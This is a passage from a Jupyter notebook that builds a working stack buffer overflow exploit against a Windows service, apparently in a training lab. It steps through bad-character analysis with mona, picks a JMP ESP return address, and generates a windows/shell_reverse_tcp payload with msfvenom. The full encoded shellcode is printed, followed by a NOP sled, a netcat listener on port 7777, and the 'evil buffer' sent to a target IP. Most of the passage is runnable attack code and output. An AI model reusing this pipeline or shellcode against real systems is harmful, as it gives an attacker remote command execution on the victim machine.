      "zsh:1: command not found: mona\n"
     ]
    }
   ],
   "source": [
    "!mona compare -f bytearray.bin -a 015D19F8"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c9f296cb-6b12-44e1-a49a-6cd1b3334502",
   "metadata": {},
   "source": [
    "^ Crashing immunity appears to be a successful result...\n",
    "\n",
    "Find characters that are not equal:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "bd865271-82c8-485c-b17b-86456219cca6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('\\\\x00\\\\x0a', '\\\\x00\\\\x0a')"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "raw_string = \"00 0a\"\n",
    "\n",
    "split_string = raw_string.split(\" \")\n",
    "final_string = []\n",
    "for i in range(1, len(split_string)):\n",
    "    if not int(split_string[i], 16) == int(split_string[i-1], 16) + 1:\n",
    "        final_string.append(split_string[i])\n",
    "badchars_full = \"\\\\x\"+\"\\\\x\".join(split_string)\n",
    "badchars_auto = \"\\\\x00\\\\x\"+\"\\\\x\".join(final_string)\n",
    "badchars_auto, badchars_full"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c6912ef5-f2ba-410e-bd4d-08e27dcf4154",
   "metadata": {},
   "source": [
    "NOTE: If you remove one and it comes back, keep it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "5210bff9-987b-4585-b459-5cbc9922384b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\x00\\x0a\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'badchars' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_2316/2437005119.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mbadchars_full\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0mkeepme\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m\"\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0mbadchars\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mbadchars\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0mkeepme\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mNameError\u001b[0m: name 'badchars' is not defined"
     ]
    }
   ],
   "source": [
    "# print(badchars_full)\n",
    "# keepme=\"\"\n",
    "# badchars=badchars+keepme"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "c8ecb739-e1f5-4d37-8762-e4cab12ba9e8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona bytearray -b \"\\x00\\x0a\"\n"
     ]
    }
   ],
   "source": [
    "# \"\\x00<OTHER BAD_CHARS>\"\n",
    "# Remmeber back to back badchars might not be bad chars! Don't remove secon ones in sequence\n",
    "# 00 11 12 40 41 5f 60 b8 b9 ee ef\n",
    "badchars = badchars_auto\n",
    "# badchars = \"\\\\x00\"\n",
    "print(\"Run this:\")\n",
    "print(\"!mona bytearray -b\", '\"%s\"' % badchars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "c9382c18-37a9-45dd-a727-a52723fcdb14",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\\\x00\\\\x0a [0, 10]\n",
      "\u000e\u000f\u0010\u0011\u0012\u0013\u0014\u0015\u0016\u0017\u0018\u0019\u001a\u001b\u001c",
      "\u001d",
      "\u001e",
      "\u001f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
      " ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ\n"
     ]
    }
   ],
   "source": [
    "bytearray_value = get_goodchars(badchars)\n",
    "print(bytearray_value)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4bc253db-593f-445c-9aff-cc7eaa377cc0",
   "metadata": {},
   "source": [
    "### Repeat!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b5d93862-4a17-479a-b9b6-6c81a88da3e5",
   "metadata": {},
   "source": [
    "# Find Jump Point:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f16e0545-423c-4e47-a94d-49cdc065d061",
   "metadata": {},
   "source": [
    "### Make sure to run while program is running or crashed:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "1433f847-06fd-4fe3-8836-1e356d16dba0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "!mona jmp -r esp -cpb \"\\x00\\x0a\"\n"
     ]
    }
   ],
   "source": [
    "print(\"!mona jmp -r esp -cpb\", '\"%s\"' % badchars)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "374180e6-8881-4798-a4a2-7b115c6ddbd1",
   "metadata": {},
   "source": [
    "### Pick a jump point and record it:"
   ]
  },
  {
   "cell_type": "raw",
   "id": "ea2272ca-0735-43af-90cd-e22b9b0c9ca6",
   "metadata": {},
   "source": [
    "Address:\n",
    "\n",
    "080416BF\n",
    "08 04 14 C3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "id": "904e68a2-2f9c-4e67-8224-ce77a6a26eaa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\b\u0004\u0016¿ , ¿\u0016\n"
     ]
    }
   ],
   "source": [
    "jump_forwards = \"\\x08\\x04\\x16\\xbf\"\n",
    "jump_backwards = \"\".join(list(reversed(jump_forwards))) # Little endian\n",
    "\n",
    "print(jump_forwards,\",\",jump_backwards)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "id": "992c60b2-e850-4c55-8452-0364c3b95c87",
   "metadata": {},
   "outputs": [],
   "source": [
    "final_retn = jump_backwards"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90e67328-c56d-4139-aa1a-7543238682cc",
   "metadata": {},
   "source": [
    "# Generate Payload:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "id": "e8243ecc-8a9b-4169-9434-82a6b940635c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n",
      "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000\n",
      "    inet 10.10.252.114/16 brd 10.10.255.255 scope global dynamic eth0\n"
     ]
    }
   ],
   "source": [
    "!ip a | grep 10."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "id": "f8e58f58-b309-490b-83c6-4f0125503cfc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: LHOST=10.10.252.114\n"
     ]
    }
   ],
   "source": [
    "%env LHOST=10.10.252.114"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "id": "4b8a7e49-e309-4458-8eed-178c0af36166",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "add to -b below\n",
      "\\x00\\x0a\n"
     ]
    }
   ],
   "source": [
    "print(\"add to -b below\")\n",
    "print(badchars)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "id": "3173552a-ae2a-40e4-a066-bca8c01ab7d9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n",
      "[-] No arch selected, selecting arch: x86 from the payload\n",
      "Found 11 compatible encoders\n",
      "Attempting to encode payload with 1 iterations of x86/shikata_ga_nai\n",
      "x86/shikata_ga_nai succeeded with size 351 (iteration=0)\n",
      "x86/shikata_ga_nai chosen with final size 351\n",
      "Payload size: 351 bytes\n",
      "Final size of c file: 1500 bytes\n",
      "unsigned char buf[] = \n",
      "\"\\xd9\\xe8\\xbd\\x0e\\xba\\x27\\xb4\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1\"\n",
      "\"\\x52\\x31\\x68\\x17\\x03\\x68\\x17\\x83\\xce\\xbe\\xc5\\x41\\x32\\x56\\x8b\"\n",
      "\"\\xaa\\xca\\xa7\\xec\\x23\\x2f\\x96\\x2c\\x57\\x24\\x89\\x9c\\x13\\x68\\x26\"\n",
      "\"\\x56\\x71\\x98\\xbd\\x1a\\x5e\\xaf\\x76\\x90\\xb8\\x9e\\x87\\x89\\xf9\\x81\"\n",
      "\"\\x0b\\xd0\\x2d\\x61\\x35\\x1b\\x20\\x60\\x72\\x46\\xc9\\x30\\x2b\\x0c\\x7c\"\n",
      "\"\\xa4\\x58\\x58\\xbd\\x4f\\x12\\x4c\\xc5\\xac\\xe3\\x6f\\xe4\\x63\\x7f\\x36\"\n",
      "\"\\x26\\x82\\xac\\x42\\x6f\\x9c\\xb1\\x6f\\x39\\x17\\x01\\x1b\\xb8\\xf1\\x5b\"\n",
      "\"\\xe4\\x17\\x3c\\x54\\x17\\x69\\x79\\x53\\xc8\\x1c\\x73\\xa7\\x75\\x27\\x40\"\n",
      "\"\\xd5\\xa1\\xa2\\x52\\x7d\\x21\\x14\\xbe\\x7f\\xe6\\xc3\\x35\\x73\\x43\\x87\"\n",
      "\"\\x11\\x90\\x52\\x44\\x2a\\xac\\xdf\\x6b\\xfc\\x24\\x9b\\x4f\\xd8\\x6d\\x7f\"\n",
      "\"\\xf1\\x79\\xc8\\x2e\\x0e\\x99\\xb3\\x8f\\xaa\\xd2\\x5e\\xdb\\xc6\\xb9\\x36\"\n",
      "\"\\x28\\xeb\\x41\\xc7\\x26\\x7c\\x32\\xf5\\xe9\\xd6\\xdc\\xb5\\x62\\xf1\\x1b\"\n",
      "\"\\xb9\\x58\\x45\\xb3\\x44\\x63\\xb6\\x9a\\x82\\x37\\xe6\\xb4\\x23\\x38\\x6d\"\n",
      "\"\\x44\\xcb\\xed\\x22\\x14\\x63\\x5e\\x83\\xc4\\xc3\\x0e\\x6b\\x0e\\xcc\\x71\"\n",
      "\"\\x8b\\x31\\x06\\x1a\\x26\\xc8\\xc1\\x2f\\xbd\\x2e\\x63\\x58\\xc3\\xce\\x9a\"\n",
      "\"\\xf9\\x4a\\x28\\xc8\\xe9\\x1a\\xe3\\x65\\x93\\x06\\x7f\\x17\\x5c\\x9d\\xfa\"\n",
      "\"\\x17\\xd6\\x12\\xfb\\xd6\\x1f\\x5e\\xef\\x8f\\xef\\x15\\x4d\\x19\\xef\\x83\"\n",
      "\"\\xf9\\xc5\\x62\\x48\\xf9\\x80\\x9e\\xc7\\xae\\xc5\\x51\\x1e\\x3a\\xf8\\xc8\"\n",
      "\"\\x88\\x58\\x01\\x8c\\xf3\\xd8\\xde\\x6d\\xfd\\xe1\\x93\\xca\\xd9\\xf1\\x6d\"\n",
      "\"\\xd2\\x65\\xa5\\x21\\x85\\x33\\x13\\x84\\x7f\\xf2\\xcd\\x5e\\xd3\\x5c\\x99\"\n",
      "\"\\x27\\x1f\\x5f\\xdf\\x27\\x4a\\x29\\x3f\\x99\\x23\\x6c\\x40\\x16\\xa4\\x78\"\n",
      "\"\\x39\\x4a\\x54\\x86\\x90\\xce\\x74\\x65\\x30\\x3b\\x1d\\x30\\xd1\\x86\\x40\"\n",
      "\"\\xc3\\x0c\\xc4\\x7c\\x40\\xa4\\xb5\\x7a\\x58\\xcd\\xb0\\xc7\\xde\\x3e\\xc9\"\n",
      "\"\\x58\\x8b\\x40\\x7e\\x58\\x9e\";\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "!msfvenom -p windows/shell_reverse_tcp LHOST={os.environ[\"LHOST\"]} LPORT=7777 EXITFUNC=thread -b \"\\x00\\x0a\" -f c\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "13d5f6f3-5311-423a-94da-3ecba0e2502c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ùè½\u000eº'´Ùt$ôX1É±R1h\u0017\u0003h\u0017Î¾ÅA2VªÊ§ì#/,W$\u0013h&Vq½\u001a^¯v¸ù\u000b",
      "Ð-a5\u001b `rFÉ0+\f",
      "|¤XX½O\u0012LÅ¬ãoäc6&¬Bo±o9\u0017\u0001\u001b¸ñ[ä\u0017<T\u0017iySÈ\u001c",
      "s§u'@Õ¡¢R}!\u0014¾æÃ5sC\u0011RD*¬ßkü$OØmñyÈ.\u000e³ªÒ^ÛÆ¹6(ëAÇ&|2õéÖÜµbñ\u001b¹XE³Dc¶7æ´#8mDËí\"\u0014c^ÄÃ\u000ek\u000eÌq1\u0006\u001a&ÈÁ/½.cXÃÎùJ(Èé\u001aãe\u0006\u0017\\ú\u0017Ö\u0012ûÖ\u001f^ïï\u0015M\u0019ïùÅbHùÇ®ÅQ\u001e",
      ":øÈX\u0001óØÞmýáÊÙñmÒe¥!",
      "3\u0013òÍ^Ó\\'\u001f_ß'J)?#l@\u0016¤x9JTÎte0;\u001d",
      "0Ñ@Ã\f",
      "Ä|@¤µzXÍ°ÇÞ>ÉX@~X\n"
     ]
    }
   ],
   "source": [
    "final_payload = (\"\\xd9\\xe8\\xbd\\x0e\\xba\\x27\\xb4\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xb1\"\n",
    "\"\\x52\\x31\\x68\\x17\\x03\\x68\\x17\\x83\\xce\\xbe\\xc5\\x41\\x32\\x56\\x8b\"\n",
    "\"\\xaa\\xca\\xa7\\xec\\x23\\x2f\\x96\\x2c\\x57\\x24\\x89\\x9c\\x13\\x68\\x26\"\n",
    "\"\\x56\\x71\\x98\\xbd\\x1a\\x5e\\xaf\\x76\\x90\\xb8\\x9e\\x87\\x89\\xf9\\x81\"\n",
    "\"\\x0b\\xd0\\x2d\\x61\\x35\\x1b\\x20\\x60\\x72\\x46\\xc9\\x30\\x2b\\x0c\\x7c\"\n",
    "\"\\xa4\\x58\\x58\\xbd\\x4f\\x12\\x4c\\xc5\\xac\\xe3\\x6f\\xe4\\x63\\x7f\\x36\"\n",
    "\"\\x26\\x82\\xac\\x42\\x6f\\x9c\\xb1\\x6f\\x39\\x17\\x01\\x1b\\xb8\\xf1\\x5b\"\n",
    "\"\\xe4\\x17\\x3c\\x54\\x17\\x69\\x79\\x53\\xc8\\x1c\\x73\\xa7\\x75\\x27\\x40\"\n",
    "\"\\xd5\\xa1\\xa2\\x52\\x7d\\x21\\x14\\xbe\\x7f\\xe6\\xc3\\x35\\x73\\x43\\x87\"\n",
    "\"\\x11\\x90\\x52\\x44\\x2a\\xac\\xdf\\x6b\\xfc\\x24\\x9b\\x4f\\xd8\\x6d\\x7f\"\n",
    "\"\\xf1\\x79\\xc8\\x2e\\x0e\\x99\\xb3\\x8f\\xaa\\xd2\\x5e\\xdb\\xc6\\xb9\\x36\"\n",
    "\"\\x28\\xeb\\x41\\xc7\\x26\\x7c\\x32\\xf5\\xe9\\xd6\\xdc\\xb5\\x62\\xf1\\x1b\"\n",
    "\"\\xb9\\x58\\x45\\xb3\\x44\\x63\\xb6\\x9a\\x82\\x37\\xe6\\xb4\\x23\\x38\\x6d\"\n",
    "\"\\x44\\xcb\\xed\\x22\\x14\\x63\\x5e\\x83\\xc4\\xc3\\x0e\\x6b\\x0e\\xcc\\x71\"\n",
    "\"\\x8b\\x31\\x06\\x1a\\x26\\xc8\\xc1\\x2f\\xbd\\x2e\\x63\\x58\\xc3\\xce\\x9a\"\n",
    "\"\\xf9\\x4a\\x28\\xc8\\xe9\\x1a\\xe3\\x65\\x93\\x06\\x7f\\x17\\x5c\\x9d\\xfa\"\n",
    "\"\\x17\\xd6\\x12\\xfb\\xd6\\x1f\\x5e\\xef\\x8f\\xef\\x15\\x4d\\x19\\xef\\x83\"\n",
    "\"\\xf9\\xc5\\x62\\x48\\xf9\\x80\\x9e\\xc7\\xae\\xc5\\x51\\x1e\\x3a\\xf8\\xc8\"\n",
    "\"\\x88\\x58\\x01\\x8c\\xf3\\xd8\\xde\\x6d\\xfd\\xe1\\x93\\xca\\xd9\\xf1\\x6d\"\n",
    "\"\\xd2\\x65\\xa5\\x21\\x85\\x33\\x13\\x84\\x7f\\xf2\\xcd\\x5e\\xd3\\x5c\\x99\"\n",
    "\"\\x27\\x1f\\x5f\\xdf\\x27\\x4a\\x29\\x3f\\x99\\x23\\x6c\\x40\\x16\\xa4\\x78\"\n",
    "\"\\x39\\x4a\\x54\\x86\\x90\\xce\\x74\\x65\\x30\\x3b\\x1d\\x30\\xd1\\x86\\x40\"\n",
    "\"\\xc3\\x0c\\xc4\\x7c\\x40\\xa4\\xb5\\x7a\\x58\\xcd\\xb0\\xc7\\xde\\x3e\\xc9\"\n",
    "\"\\x58\\x8b\\x40\\x7e\\x58\\x9e\")\n",
    "\n",
    "print(final_payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6bc3aded-959e-4790-b6b1-1008e59e53fa",
   "metadata": {},
   "source": [
    "# Add Padding:\n",
    "\n",
    "This gives the exploit room to unpack itself"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "fc5660a6-bf1f-4f0b-880c-33fbf8e99681",
   "metadata": {},
   "outputs": [],
   "source": [
    "padding = \"\\x90\" * 16"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b8a4c36c-b830-4de4-b2aa-b04f7b5bf131",
   "metadata": {},
   "source": [
    "# Run Exploit:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "10e36d28-a8cd-4499-abb6-70efb67ce4cb",
   "metadata": {},
   "source": [
    "Run Netcat:"
   ]
  },
  {
   "cell_type": "raw",
   "id": "332f8dd7-10fc-406c-80aa-99059beb1758",
   "metadata": {},
   "source": [
    "nc -lvnp 7777"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ae61a41-fd4f-472f-8331-9781ab1ded19",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n"
     ]
    }
   ],
   "source": [
    "run_overflow(final_payload, offset=offset, retn=final_retn, padding=padding, prefix=prefix)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "id": "e42460be-ce92-459a-b69e-37617fd7a56a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending evil buffer...\n",
      "Done!\n"
     ]
    }
   ],
   "source": [
    "target = \"10.10.92.230\"\n",
    "run_overflow(final_payload, offset=offset, retn=final_retn, padding=padding, prefix=prefix, target=target)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb60a747-4a27-42e6-a8f3-a2f282a4aa17",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
